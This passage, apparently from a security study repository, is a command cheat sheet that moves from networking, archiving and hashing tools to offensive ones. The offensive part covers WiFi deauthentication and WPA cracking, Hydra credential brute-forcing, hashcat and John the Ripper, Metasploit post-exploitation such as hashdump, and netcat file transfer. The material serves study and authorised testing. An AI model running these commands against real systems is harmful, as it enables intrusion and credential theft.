```bash
ip [options] object {command | help}

# Show all network interfaces
ip addr show

# Show a specific network interface
ip addr show <interface_name>

# Show routing table
ip route show

# Show ARP table
ip neigh show

# Show all network interfaces and their status  
ip link show
```

<details>
<summary>Want to see more advanced usage of the <code>ip</code> command?</summary>

```bash
# Bring up a network interface
ip link set <interface_name> up

# Bring down a network interface
ip link set <interface_name> down

# Add a new IP address to an interface
ip addr add <ip_address>/<subnet_mask> dev <interface_name>

# Delete an IP address from an interface
ip addr del <ip_address>/<subnet_mask> dev <interface_name>

# Add a new route
ip route add <destination_network>/<subnet_mask> via <gateway_ip> dev <interface_name>

# Delete a route
ip route del <destination_network>/<subnet_mask> via <gateway_ip> dev <interface_name>
```

</details>

## Ping
The `ping` command is used to check the reachability of a host on a network and measure the round-trip time for messages sent from the originating host to a destination computer.

```bash
ping <IP_or_hostname>  

# Example usage
ping 8.8.8.8             # Ping Google's public DNS server
ping -c 4 example.com    # Ping example.com 4 times
ping -i 2 8.8.8.8        # Ping 8.8.8.8 with 2 second interval between packets
ping -t 10 8.8.8.8       # (Windows) Ping 8.8.8.8 10 times
ping -s 100 8.8.8.8      # Send 100 bytes of data per packet
ping -W 2 8.8.8.8        # Set timeout to 2 seconds for each reply
```

**Key options:**  
`-c <count> `=  Number of packets to send  
`-i <interval>` = Interval between packets (in seconds)   
`-s <size> `   = Number of data bytes to be sent  
`-W <timeout>` = Time to wait for a response (in seconds)  
`-t <ttl> `    = Set Time To Live (number of hops)  
`-I <interface>` = Specify the source interface to use
## traceroute
The `traceroute` command is used to trace the route that packets take from the source host to a destination host. It shows the IP addresses of the routers along the path and the time taken for each hop.

```bash
traceroute <IP_or_hostname>

# Example usage
traceroute google.com        # Trace the route to google.com
traceroute 8.8.8.8           # Trace the route to an IP address
traceroute -n google.com     # Trace the route to google.com without resolving hostnames
```

> On Windows, use `tracert` instead of `traceroute`.
```bash
tracert <IP_or_hostname>

# Example usage
tracert google.com        # Trace the route to google.com
tracert 8.8.8.8           # Trace the route to an IP address
tracert -d google.com     # Trace the route to google.com without resolving hostnames
```

**Key options:**  
`-n` = Do not resolve hostnames (show only IPs)  
`-m <max_ttl>` = Set the max number of hops (max TTL)  
`-w <timeout>` = Set the timeout (in seconds) for each reply  
`-q <nprobes>` = Number of probe packets per hop  
`-I` = Use ICMP ECHO instead of UDP packets (like Windows tracert)  
`-T` = Use TCP SYN packets instead of UDP
## telnet
The `telnet` command is used to connect to remote servers using the Telnet protocol. It allows you to interact with remote systems over a network.

```bash
telnet <IP_or_hostname> <port>

# Example usage
telnet example.com 23     # Connect to example.com on port 23 (default Telnet port)
```

**Key commands inside a Telnet session:**
- `Ctrl + ]` = Escape to telnet prompt
- `quit`     = Exit telnet
- `open <host> <port>` = Connect to another host/port
- `close`    = Close current connection
- `status`   = Print status information
## curl
Tool for transferring data with URLs. It supports various protocols, including HTTP, HTTPS, FTP, and more. It is commonly used to download files, interact with APIs, and perform web requests.

```bash
# Fetch the content of a URL 
curl <URL> 

# Downloading a file (save it with the same name as in the URL)
curl -O <URL>
```

**Key options:**  
`-s` to suppress the output (statistics)  
`-#` show progress bar   
`-o page.html <URL>` to save the output to a file  
`-O <URL>` to save the output to a file with the same name as the file in the URL  (download)  
`-I <URL>` to get the headers only  
`-L <URL>` to follow redirects  
`-b <NAME1=VALUE1;NAME2=VALUE2>` specify cookies  
`-d <data> <URL>` to send data  
`-X <METHOD> <URL>` to change the request method  
`-T <FILE> <URL>` to upload a file  
`-u <USER>:<PASSWORD>` to authenticate  
`-A <AGENT> <URL>` to change the user agent  
`--referer <URL_REF> <URL>` to change the referer   
`-H <HEADER> <URL>` to add headers  
`-H "DNT: 1" <URL>` to change the DNT(do not track) header   
`-H "X-Forwarded-For: <IP>" <URL>` to change the X-Forwarded-For header  
`-H "Accept-Language: da-DK" <URL>` to change the Accept-Language header (ex. Danish)  
`-H "Date: Mon, 23 11 2018 23:23:23 GMT" <URL>` to change the date  

**Demo of advanced use case**  
```bash
curl -s -A "PicoBrowser" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" -H "Accept-Language: sv-SE" --referer http://mercury.picoctf.net:36622 http://mercury.picoctf.net:36622/ | grep -oI "picoCTF{.*}"
```
## wget
The wget command downloads files from HTTP, HTTPS, or FTP connection a network.  

```bash
# Download a file from a URL
wget <URL>

# Download files from an FTP server recursively
wget -r ftp://ftpuser:<USER>@<IP> 
```

**Key options:**  
`-O` = to specify the output file  
`-b` = to run in the background  
`-r` = to download recursively  
`-q` = to download in quiet mode  
## ftp
FTP or File Transfer Protocol is a network communication protocol that enables two computers to communicate

```bash
ftp <IP> 
```

Enter your username and password to log in to the server. Some FTP servers allow anonymous logins with a username and password of "`anonymous`".

**Key Commands:**    
`ls` = list files in the current directory  
`cd <directory>` = change directory  
`get <file>` = download a file from the server  
`put <file>` = upload a file to the server  
`more <file>` = view the contents of a file  
`quit` = exit the FTP session

See more commands [here](/More/FTP/Readme.md).
## ssh
SSH or Secure Shell is a network communication protocol that enables two computers to communicate

```bash
ssh user@ip
```
And then type the password to log in. If you have a private key, you can use it to log in without a password.

```bash
ssh -i path_to_pem user@ip
```

Creating an SSH tunnel  
```bash
ssh -D 8080 -C -q -N user@ip # Create a tunnel
chromium --no-sandbox --proxy-server="socks5://localhost:8080" # Use the tunnel
```

**Key options:**  
`-i <path_to_pem>` = specify the path to the private key file  
`-p <port>` = specify the port to connect to (default is 22)  
`-v` = verbose mode (useful for debugging)  
`-X` = enable X11 forwarding (allows running GUI applications over SSH)  
`-C` = enable compression (useful for slow connections)  
`-N` = do not execute a remote command (useful for port forwarding)  
`-L <local_port>:<remote_host>:<remote_port>` = local port forwarding  
`-R <remote_port>:<local_host>:<local_port>` = remote port forwarding
## scp
SCP or Secure Copy Protocol is a network communication protocol that enables two computers to communicate and transfer files between them using the SSH protocol.

```bash
scp [options] source destination

# Copy a file to a remote server  
scp /path/to/file user@ip:/path/to/remote/file

# Copy a file from a remote server to a local server  
scp user@ip:/path/to/remote/file /path/to/file

# Example (file to a remote server ):  
scp example.txt berkan@192.168.100.123:/home/berkan/
```
**Key options:**  
`-r` = copy directories recursively  
`-P <port>` = specify the port to connect to (uppercase P)  
`-i <path_to_pem>` = specify the path to the private key file  
`-v` = verbose mode (useful for debugging)  
`-p` = preserve file attributes (permissions, timestamps, etc.)  
## xfreerdp
xfreerdp is an X11 Remote Desktop Protocol (RDP) client.

```bash
xfreerdp [options] server[:port] [[options] server[:port] ...]

# Example usage
xfreerdp /u:username /p:password /v:hostname:port /cert:ignore /ipv6
```

**Key options:**   
`/u:<username>` - Username  
`/p:<password>` - Password  
`/v:<hostname>:<port>` - Server hostname  
`/cert:ignore` - Ignore certificate  
`/ipv6`, `/6` - Prefer IPv6 AAA record over IPv4 A record
## netdiscover
Netdiscover is a tool that can be used to scan for live hosts on a network (part of the `aircrack-ng` suite).

> It is particularly useful for identifying active devices on a network, especially in environments where DHCP is not available or when you want to quickly discover devices without using more complex tools.

```bash
netdiscover -i wlan0mon  # Scan for live hosts on the wlan0mon interface
netdiscover -r <ip>/24  # Scan a specific IP range
```
## netstat
Displays network connections and listening ports. It can show both TCP and UDP connections, as well as the processes using those connections.

```bash
netstat -tulpn  # Display all active listening ports
```
**Key options:**  
`-t` = show TCP connections  
`-u` = show UDP connections  
`-l` = show only listening sockets  
`-p` = show the process using the socket  
`-n` = show numerical addresses instead of resolving hostnames (stops DNS lookups)  
`-a` = show all connections and listening ports  
`-r` = display the routing table

> 'ss' is now a better alternative to netstat, see below.
## ss
Displays socket statistics and information about network connections. It is a replacement for the `netstat` command and provides more detailed information about sockets.

```bash
ss -tulpn  # Display all active listening ports with process information
```
## tcpdump
Packet analyzer tool used to capture and analyze network traffic. 
> It allows users to intercept and display the packets being transmitted or received over a network.

```bash
tcpdump -i <interface>  # Capture packets on a specific network interface

# Examples
tcpdump -i wlan0mon -n  # Capture packets on the wlan0mon interface without resolving hostnames
tcpdump -i wlan0mon -w capture.pcap  # Capture packets and save them to a file
tcpdump -i wlan0mon -r capture.pcap  # Read packets from a file
tcpdump -i wlan0mon -c 100  # Capture only 100 packets
tcpdump -i wlan0mon -q  # Capture packets with brief output
tcpdump -i wlan0mon -e  # Capture packets and include MAC addresses
tcpdump -i wlan0mon -A  # Capture packets and print packet data as ASCII
```

**Key options:**  
`-i` = to specify the interface to capture traffic on  
`-n` = to display IP addresses instead of hostnames (stops DNS lookups)  
`-w` = to write the captured packets to a file  
`-r <file>.pcap` = to read packets from a file  
`-q` = to get brief packet information  
`-e` = to include MAC addresses  
`-A` = to print packet data as ASCII  
`-c <number>` = to specify the number of packets to capture  
`-v` = to increase verbosity (use -vv for more)  
## dig
Retrieve information about domain names, IP addresses, and other DNS records.

```bash
dig <domain> <type>  

# Example:
dig example.com A +short  # Get the A record for example.com in short format
```
* `<domain>` = The domain name to query (e.g., `example.com`)  
* `<type>` = The type of DNS record to query (e.g., `A`, `MX`, `CNAME`, `NS`, etc.)  

**Key options:**  
`+short` = Short output format  
`+trace` = Trace the delegation path from the root servers  
`+noall +answer` = Show only the answer section of the response  
`-x` = Specify IP adress  
`-f` = save to a file  
## wash
Wash is a tool that scans for WPS-enabled networks and displays information about them (part of the `aircrack-ng` suite).

```bash
wash -i wlan0mon  # Scan for networks using the wlan0mon interface
wash -i wlan0mon -C  # Scan for networks and show the channelerrors
```
## whatweb
WhatWeb is a web scanner that identifies websites and their technologies. It can detect web servers, programming languages, frameworks, and more.

```bash
whatweb <URL>  # Scan a specific URL

# Example usage:
whatweb --no-errors 10.10.10.0/24 # Scan a range of IP addresses
```

**Key options:**  
`-a=LEVEL` = Aggresion level  
`-U=AGENT` = User agent  
`--header` = HTTP header  
`--max-redirects=NUM` = Maximum number of redirects   
`-u=<user:password>` = Basic authentication  
`-c=COOKIES` = Use cookies  
`--cookie-jar=FILE` = Read cookies from a file  
`-g=STRING|REGEXP` = Search for a string  
`--no-errors` = Suppress error messages  
`-p=LIST` = List all plugins  
`-l` = List all plugins  
`-v` = Verbose mode  
`-q` = Quiet output  
`-h` = to show help (highly recommended)  

</Details>

##  <!-- Compression & Archiving -->
<h1 align="center">Compression & Archiving</h1>

In this section: [Tar](#tar), [Gzip](#gzip), [7z](#7z)

<Details open>
<summary>Hide Compression & Archiving Commands</summary>

## tar
`tar` is a command that allows creating, maintaining, modifying, and extracting files that are archived in the tar format (tar, gzip, zip).

```bash
# Creating a tar archive
tar -cf archive.tar file1.txt file2.txt 

# Extracting a tar archive (most common)
tar -xf archive.tar 

# Compressing files with tar
tar -czvf stuff.tar.gz file1.txt file2.txt 

# Uncompressing files with tar
tar -xvzf myfolder.tar.gz -C myfolder/  # Extract the contents into the myfolder directory
```

**Key options:**  
`-c` tells tar to create an archive.  
`-z` tells tar to compress the archive with gzip.  
`-v` tells tar to be verbose.  
`-f` tells tar that the next argument will be the name of the archive to operate on.  
`-C` tells tar to change to the directory specified before performing any operations.	   
`-x` tells tar to extract files from an archive.  
## gzip
`gzip` is a file format and a software application used for file compression and decompression. gzip-compressed files have a `.gz` extension.

```bash
# Compress a file
gzip filename.txt 

# Compress a directory (recursively)
gzip -r directory/ 

# Compress multiple files
gzip file1.txt file2.txt 

# Decompress a file
gzip -d filename.txt.gz  # or use 'gunzip filename.txt.gz'
```

**Key options:**  
`-d` = decompress a file  
`-k` = keep the original file after compression  
`-r` = recursively compress files in directories  
`-v` = verbose output, showing compression details  
`-1` to `-9` = set compression level (1 is fastest, 9 is best compression)
## 7z
7z is a file archiver with a high compression ratio.

```bash
# Create a 7z archive
7z a archive.7z file1.txt file2.txt

# Extract a 7z archive
7z x archive.7z

# Compress a directory
7z a archive.7z directory/

# Create a password-protected 7z archive
7z a -p<SECRET> archive.7z file1.txt file2.txt

# Extract a password-protected 7z archive
7z x archive.7z -p<SECRET>
```

**Key options:**  
`a` = add files to an archive (`-tzip` for zip archives)  
`x` = extract files from an archive  
`l` = list contents of an archive    
`-p<SECRET>` = create or extract a password-protected archive  
`-m0=LZMA2` = use LZMA2 compression method (default)  
`-mem=AES256` = use AES-256 encryption for the archive  
`-mx=9` = set compression level (0-9, where 9 is the highest compression)  
`-t7z` = specify the archive type as 7z  
`-o<output_directory>` = specify the output directory for extraction

**Demo use case:**
```bash
# Create a password-protected 7z archive  
7z a <Zip folder> <Files or *> -p<SECRET>

# Extract a password-protected 7z archive  
7z x <Zip folder> -p<SECRET>
```

**Advanced Example**
```bash
7z a -tzip -p123 -mem=AES256 secret.zip secret
```
> Without `-mem=AES256`, the contents will be compressed but the file names will still be visible (no filename encryption).

This command creates a password-protected zip archive named `secret.zip` containing the `secret` directory, using AES-256 encryption.

For simple version `zip -e -r secret.zip secret` can also be used (legacy).

</Details>

##  <!-- Cryptography & Encoding -->
<h1 align="center">Cryptography & Encoding</h1>

In this section: [base64](#base64), [rax2](#rax2), [hashid](#hashid), [hash-identifier](#hash-identifier), [haiti](#haiti), [shasums](#shasums), [gpg](#gpg)

<Details open>
<summary>Hide Cryptography & Encoding Commands</summary>
 
## base64
Decrypt base64  
```bash
base64 -d file.txt
```
The `-d` option is used to decode the base64 encoded data.

Encrypt base64  
```bash
base64 -i input.txt -o output.txt
```
The `-i` option is used to specify the input file, and the `-o` option is used to specify the output file. If no output file is specified, it will print the encoded data to standard output.
## rax2 
rax2 (part of the Radare2 suite) comes in handy when there is a need to make base conversions between hexadecimal representations, floating point values, hex-pair strings to ASCII, binary, octal, integer and so on.

```bash
rax2 <options> <value>

# Convert hex string to raw bytes
rax2 -s 0x424b  
```

**A list of most useful flags:**   
```bash
-a      show ascii table     ;  rax2 -a
-b      bin -> str           ;  rax2 -b 01000010 01001011 # BK
-B      str -> bin           ;  rax2 -B hello # 0110100001100101011011000110110001101111
-d      force integer        ;  rax2 -d 3 -> 3 instead of 0x3
-D      base64 decode        ;  rax2 -D SGVsbG8gd29ybGQ= # Hello world
-E      base64 encode        ;  rax2 -E Hello world # SGVsbG8gd29ybGQ=
-f      floating point       ;  rax2 -f 6.3+2.1
-I      IP address <-> LONG  ;  rax2 -I 3530468537 # 185.172.110.210
-k      keep base            ;  rax2 -k 33+3 -> 36
-K      randomart            ;  rax2 -K 0x34 1020304050
-L      bin -> hex(bignum)   ;  rax2 -L 111111111 # 0x1ff
-n      binary number        ;  rax2 -n 0x1234 # 34120000
-o      octalstr -> raw      ;  rax2 -o \162 \62 # r2
-N      binary number        ;  rax2 -N 0x1234 # \x34\x12\x00\x00
-r      multiple outputs     ;  rax2 -r 0x1234 
-s      hexstr -> raw        ;  rax2 -s 42 4b # BK
-S      raw -> hexstr        ;  rax2 -S < /bin/ls > ls.hex
-t      tstamp -> str        ;  rax2 -t 1234567890 # Sat Feb 14 00:31:30 2009
-x      hash string          ;  rax2 -x linux #0x5ca62a43
-u      units                ;  rax2 -u 389289238 # 317.0M
-w      signed word          ;  rax2 -w 16 0xffff
```
## hashid
Hashid will analyze and output the potential algorithm that is used to hash your input.  Supports over 250 hash types.  

```bash
hashid [options] hash

# Example usage
hashid 5d7845ac6ee7cfffafc5fe5f35cf666d
```

**Key options:**  
`-e` = list all possible hash algorithms including salted passwords  
`-m` = include corresponding hashcat mode in output  
`-j` = include corresponding JohnTheRipper format in output  
`-o FILE` = write output to file (default: STDOUT)  
`-h` = show help message and exit  
## hash-identifier
Hash-identifier will analyze and output the potential algorithm that is used to hash your input. I would say that it is a better alternative to hashid. Supports over 100 hash types.

```bash
hash-identifier <hash>
```
## haiti
Haiti is another great tool to identify a hash type. It also returns the format that can be used with john the ripper and hashcat to crack the hash. It supports over 500 hash types.

Installation: `gem install haiti-hash`

```bash
haiti <hash>
```
## shasums
**Find SHA1 hash for a file**  
```bash
shasum file.txt
```

**Find SHA256 hash for a file**
```bash
sha256sum file.txt
```

**Find MD5 hash for a file**  
```bash
md5sum file.txt
```
## gpg
To encrypt a file:  
```bash
gpg -c data.txt
```
> Enter a passphrase when prompted. This will create an encrypted file named `data.txt.gpg`.

To **decrypt** the file:  
```bash
gpg -d data.txt.gpg
```
> Enter the same passphrase you used to encrypt the file. This will output the decrypted content to standard output.

</Details>

##  <!-- Exploitation & Pentesting Tools -->
<h1 align="center">Exploitation & Pentesting Tools</h1>

In this section: [searchsploit](#searchsploit), [cewl](#cewl), [crunch](#crunch), [fcrackzip](#fcrackzip)

<Details open>
<summary>Hide Exploitation & Pentesting Tools Commands</summary>

## searchsploit
Searchsploit is a command line search tool for the offline version of Exploit-DB.

```bash
searchsploit [options] term1 term2 term3 ...

# Example usage
searchsploit windows local
```

**Key options:**  
`-c [Term]` = Perform a case-sensitive search  
`-e [Term]` = Perform an EXACT search  
`-s` = Perform a strict search ("1.1" would not be detected in "1.0 < 1.3")  
`-t [Term]` = Search JUST the exploit title (Default is title AND the file's path   
`-p [EDB-ID]` =  Show the full path to an exploit    
`-w` = Show URLs to Exploit-DB.com rather than the local path  
`--exclude="term1|term2"` = Exclude results matching terms (use "|" to separate multiple)
## cewl 
Cewl is a tool that spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper. See more [here](/More/Password%20Cracking/Wordlist-generation.md/cewl/Readme.md).

Install: `sudo apt-get install cewl`

```bash
cewl <url> -w <output file>

# Example usage
cewl https://example.com -w wordlist.txt
```

**Key options:**  
- `-w` for saving the generated wordlist to a file.
- `-d` for setting the depth of the spider.
- `-m` for setting the minimum word length.
- `-x` for setting the maximum number of words to return.
## crunch
Crunch is a wordlist generator that can generate all possible combinations and permutations.

Install: `sudo apt-get install crunch`

```bash
crunch <min> <max> <characters>

# Generate a wordlist with all combinations of 8 characters from the alphabet
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
```

**Key options:**  
`-t` for adding a pattern to the generated wordlist.  
`-o` for saving the generated wordlist to a file.
## fcrackzip 
Is a password cracker that runs on `.zip` files. It can use brute force or dictionary attacks to crack the password of a zip file.

Install: `sudo apt-get install fcrackzip`

```bash
fcrackzip [options] <wordlist path> <filepath>

# To use a dictionary attack with a wordlist and unzip a file
fcrackzip -Dupvb /usr/share/wordlists/rockyou.txt secret.zip

# To unzip a file with a password
fcrackzip -u -p <password> secret.zip
```

**Key options**  
`-b` for using brute force algorithms.   
`-D` for using a dictionary.  
`-v` for verbose mode.  
`-p` for using a string as a password.  
`-u` for unzipping.

</Details>

##  <!-- Compilers -->
<h1 align="center">Compilers</h1>

In this section: [gcc](#gcc)

<Details open>
<summary>Hide Compilers Commands</summary>

## gcc
gcc is a compiler that can be used to compile C as well as Python code to an executable file.

```bash
gcc [options] <input>

# Compile hello.c to an executable named hello
$ gcc -o hello hello.c 
$ ./hello  # Run the compiled program
```

**Key options:**  
`-o <output>` = specify the output file name 

</Details>

# Tools (CLI)
Command-line tools for security testing and analysis. Start with Nmap for network discovery, then web tools like Gobuster.

Legal Notice: Only use on systems you own or have permission to test.

## Aircrack-ng
[Aircrack-ng](https://www.aircrack-ng.org) - is a complete suite of tools to assess WiFi network security

```bash
# Monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (to capture handshake)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA/WPA2 with wordlist
aircrack-ng -w wordlist.txt capture-01.cap
```

**Key tools in suite:**
- airmon-ng: Enable/disable monitor mode
- airodump-ng: Capture packets and show wireless networks
- aireplay-ng: Inject packets (deauth, fake auth)
- aircrack-ng: Crack WEP/WPA keys

See detailed cheatsheet [here](https://cheatography.com/itnetsec/cheat-sheets/aircrack-ng-suite/)
## Gobuster
[Gobuster](https://github.com/OJ/gobuster) is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names
### Syntax
`gobuster -w wordlist.txt`

### Examples:  
Standard scan  
`gobuster dir -u http://172.162.39.86 -w /usr/share/wordlists/dirb/megalist.txt` 

DNS subdomain enumeration  
`gobuster dns -d http://172.162.39.86 -w /usr/share/SecLists/Discovery/DNS/namelist.txt`

### A list of options
`dir` Directory/file brute forcing mode  
`dns` DNS bruteforcing mode

### A list of most useful flags:
`-u` (url) – full target URL (including scheme), or base domain name.  
`-w` (wordlist) – path to the wordlist used for brute forcing (use – for stdin).  
`-a` (user agent string) – specify a user agent string to send in the request header.  
`-e` (print) - Print the full URLs in your console  
`-o` (file) – specify a file name to write the output to.  
`-x` (extensions) – list of extensions to check for, if any.  
`-P` (password) – HTTP Authorization password (Basic Auth only, prompted if missing).  
`-U` (username) – HTTP Authorization username (Basic Auth only).  
`-c <http cookies>` (cookie) - Specify a cookie for simulating your auth  
`-s` (status-codes) - Set status codes that should be interpreted as valid  
`-k` (ssl) - Skip ssl certificate   
`-H` (HTTP) - Specify HTTP header  
`-t` (threads) - Number of concurrent threads (default: 10)  
`-v` (verbose) - Verbose output  
`-q` (quiet) - Quiet output  
`-n` (no-redirect) - Do not follow redirects  
`-r` (recursive) - Recursively brute force subdirectories  

Find a list of seclists [here.](https://github.com/danielmiessler/SecLists)
## Feroxbuster
feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories.

**Syntax:**    
`feroxbuster [OPTIONS]`

**Example:**  
`feroxbuster -u https://berkankutuk.dk -w /usr/share/wordlists/dirb/big.txt` 

**Options:**  
`-h, --help` - Print help information    
`-V, --version` - Print version information    
`-u, --url <URL>` - The target URL   
`-b, --cookies <COOKIE>` - Specify HTTP cookies to be used in each request   
`-m, --methods <HTTP_METHODS>` -  Which HTTP request method(s) should be sent (default: GET)  
`-x, --extensions <FILE_EXTENSION>` - File extension(s) to search for (ex: -x php -x pdf js)  
`-C, --filter-status <STATUS_CODE>` - Filter out status codes (deny list) (ex: -C 200 -C 401)  
`-s, --status-codes <STATUS_CODE>` - Filter status codes (allow list) (default: 200 204 301 302 307 308 401 403 405)  
`-r, --redirects` - Allow client to follow redirects  
`-T, --timeout <SECONDS>` - Number of seconds before a client's request times out (default: 7)  
`-d, --depth <RECURSION_DEPTH>` - Maximum recursion depth, a depth of 0 is infinite recursion (default: 4)  
`-e, --extract-links` - Extract links from response body and make new requests based on findings  
`-L, --scan-limit <SCAN_LIMIT>` - Limit total number of concurrent scans (default: 0, i.e. no limit)  
`-n, --no-recursion` - Do not scan recursively  
`-t, --threads <THREADS>` - Number of concurrent threads (default: 50)  
`--time-limit <TIME_SPEC>` - Limit total run time of all scans (ex: --time-limit 10m)  
`-w, --wordlist <FILE>` - Path to the wordlist  
`-o, --output <FILE>` - Output file to write results  
`-v, --verbosity` - Increase verbosity level (use -vv or more for greater effect. '4' -v's is probably too much)
## Hashcat
[Hashcat](https://hashcat.net/hashcat/) is a particularly fast, efficient, and versatile hacking tool that assists brute-force attacks by conducting them with hash values of passwords that the tool is guessing or applying. See [Cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/).  

Learn [How to brute-force passwords using GPU and CPU in Linux](https://miloserdov.org/?p=4726).  
Convert [WPA/WPA2 handshake from a pcap file to a modern hashcat compatible hash file](https://hashcat.net/cap2hashcat/).

### Syntax
`hashcat -m <number> <hash_file> <dict_file>`

### Example 
Dictionary  
`hashcat -m 1800 -a 0 hashed.txt /usr/share/wordlists/rockyou.txt -o output.txt`  

Bruteforce  
`hashcat -m 0 -a 3 -i hashed.txt ?a?a?a?a?a?a?a -o output.txt`

### Flags
`-m` sets the [mode](https://hashcat.net/wiki/doku.php?id=example_hashes)   
`-a` sets the attack mode (0=Straight,1=Combination,3=Bruteforce,6=Hybrid:wlist+mask,7=Hybrid:mask+wlist)  
`-o` output to filename   
`-r` sets rules  
`--status`  keep screen updated   
`--runtime` abort after X seconds   
`--force` sets workload to insane (This can lead to false positives)  
`-i` increment (bruteforce)

### Attack modes
0=Straight  
1=Combination  
3=Bruteforce  
6=Hybrid:wlist+mask  
7=Hybrid:mask+wlist  

### Charsets
`?l`  Lowercase a-z  
`?u`  Uppercase A-Z  
`?d`  Decimals  
`?h`  Hex using lowercase chars    
`?H`  Hex using uppercase chars  
`?s`  Special chars     
`?a`  All (l,u,d,s)  
`?b`  Binary  
## Hydra
[Hydra](https://github.com/vanhauser-thc/thc-hydra) is a tool used to brute-force username and password to different services such as ftp, ssh, telnet, MS-SQL, etc.
### Syntax  
`hydra -options path`  

### Examples:  
Guess SSH credentials using a given username and a list of passwords:  
`hydra -l username -P path/to/wordlist.txt host_ip -t 4 ssh -V`

Guess Telnet credentials using a list of usernames and a single password, specifying a non-standard port and IPv6:  
`hydra -L path/to/usernames.txt -p password -s port -6 host_ip telnet`

Guess FTP credentials using usernames and passwords lists, specifying the number of threads:  
`hydra -L path/to/usernames.txt -P path/to/wordlist.txt -t n_threads host_ip ftp` 

Guess MySQL credentials using a username and a passwords list, exiting when a username/password pair is found:  
`hydra -l username -P path/to/wordlist.txt -f host_ip mysql`

Web form credentials:   
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip_adress> http-post-form "/login:username=^USER^&password=^PASS^:F=Username or password invalid" -V`

Guess IMAP credentials on a range of hosts using a list of colon-separated username/password pairs:  
`hydra -C path/to/username_password_pairs.txt imap://[host_range_cidr]`

Guess POP3 credentials on a list of hosts using usernames and passwords lists, exiting when a username/password pair is found:  
`hydra -L path/to/usernames.txt -P path/to/wordlist.txt -M path/to/hosts.txt -F pop3`

### A list of most useful options:
`-S` connect via SSL  
`-f` specify host  
`-s` specify a port  
`-l` single username  
`-L` wordlist username(s)   
`-p` single password   
`-P` wordlist password(s)    
`-o` FILE write found login/password pairs to FILE instead of stdout  
`-V` verbose mode, see output for every attempt  
`-I` ignore the resume dialog  
`-t <number> `specifies the number of threads to use  
`-u` by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins, then the next password.  
## John The Ripper
[John The Ripper](https://www.openwall.com/john/) is a fast password cracker, currently available for many flavors of Unix, Windows, and other. [Cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/john_cheatsheet/)

### Syntax
`john <hash_file> --wordlist=<wordlist>`

### Examples
Cracking MD5 hashes  
`john --format=raw_md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

### SSH Private Key
Crack hashed private key  
`python /usr/share/john/ssh2john.py id_rsa > hash.txt`

ssh2john.py can sometimes also be located under `/opt/john/ssh2john.py`

Crack the hash (or a shadow file)  
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

See more about [JTR](/More/Password%20Cracking/John.md).

### Zip Files
Crack a zip file using zip2john

First, convert the zip file to a hash  
`zip2john file.zip > zip.hash`

Then crack the hash  
`john zip.hash`

## Metasploit
The Metasploit Framework is a powerful tool for penetration testing, exploit development, and vulnerability research, offering modules for information gathering, scanning, exploitation, and post-exploitation.

- **Auxiliary:** Supports modules like scanners, crawlers, and fuzzers.
- **Encoders:** Encode exploits and payloads to evade signature-based antivirus detection.
- **Payloads:**
  - **Singles:** Self-contained payloads (e.g., add user, open app) that run without additional downloads.
  - **Stagers:** Establish connection channels between Metasploit and the target, facilitating the download of staged payloads.
  - **Stages:** Larger payloads downloaded by stagers to expand functionality.

**Single payloads** use an underscore (e.g., `generic/shell_reverse_tcp`), while **staged payloads** use a slash (e.g., `windows/x64/shell/reverse_tcp`).

### How to use

Initialize the database  
`msfdb init`  

View advanced options for starting the console  
`msfconsole -h`  

Start metasploit  
`msfconsole`

Check db connection  
`db_status`

Msf commands  
`help` or `?` - shows the help page

Search exploit  
`search <exploit_for>`

Select module  
`use <module>`

Change value of a variable  
`set <variablename> <value>`  
`get <variablename>`  
`unset <variablename>` 

Save msfconsole session  
`save`

Save console outputs  
`spool` 

See privileges of a current user  
`getprivs`

Tranfer files to victim computer  
`upload`

Check if the victim pc is in a VM (Windows)  
`run post/windows/gather/checkvm`

See what a machine could be vulnerable to  
`run post/multi/recon/local_exploit_suggester`

Spawn a normal system shell  
`shell`

### Meterpreter
**Meterpreter** is a Metasploit payload that runs in memory on the target system without installation, avoiding detection by antivirus, IDS, and IPS. It communicates with Metasploit via encrypted channels but can still be detected by some antivirus programs.

### Key Features:
- **Post-exploitation:** Allows further data gathering, privilege escalation, and lateral movement.
- **Migrate:** Move to another process (e.g., `word.exe`) to interact with it or capture keystrokes. Use `migrate <PID>`.
  - > You may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver).
- **Hashdump:** Dumps the SAM database of Windows to retrieve NTLM password hashes for cracking or Pass-the-Hash attacks. One example of this is [ntlm.pw](https://ntlm.pw/).
- **Search:** Use `search -f <filename>` to locate files with sensitive data.
- **Shell:** Launches a standard command-line shell on the target. Use `CTRL+Z` to return to Meterpreter.

These features make Meterpreter a powerful tool for post-exploitation activities.

See some of the available commands [here](/More/Metasploitable/Meterpreter/Readme.md).

## Netcat
[Netcat](http://netcat.sourceforge.net) aka nc is an extremely versatile tool. It allows users to connect to specific ports and send and receive data. It also allows machines to receive data and connections on specific ports, which makes nc a very popular tool to gain a Reverse Shell.

### Syntax
Computer B (acts as the receiving server):  
`nc -lvnp 6790 > testfile.txt`  
Computer A (acts as the sending client):  
`nc [IP address of computer B] 6790 < testfile.txt`  

<details>
<summary>Chat Server example</summary>

```bash	
# Computer A
nc -lvp 1337

# Computer B
nc -v <ip_pc_a> 1337
```

</details>

### A list of most useful switches:
`-l` Listen to connections (TCP)  
`-v` Enable verbose mode (allows you to see who connected to you)  
`-p` Specify a port to listen to  
`-e` Specify program to execute after connecting to a host  
`-u` Connect to UDP ports    
`-n` Fast scan by disabling DNS resolution  
`-w` Define timeout value  
`-4` IPv4 only   
`-6` IPv6 only  
`>` Server file redirection  
`<` Client file redirection
## Nikto 2 
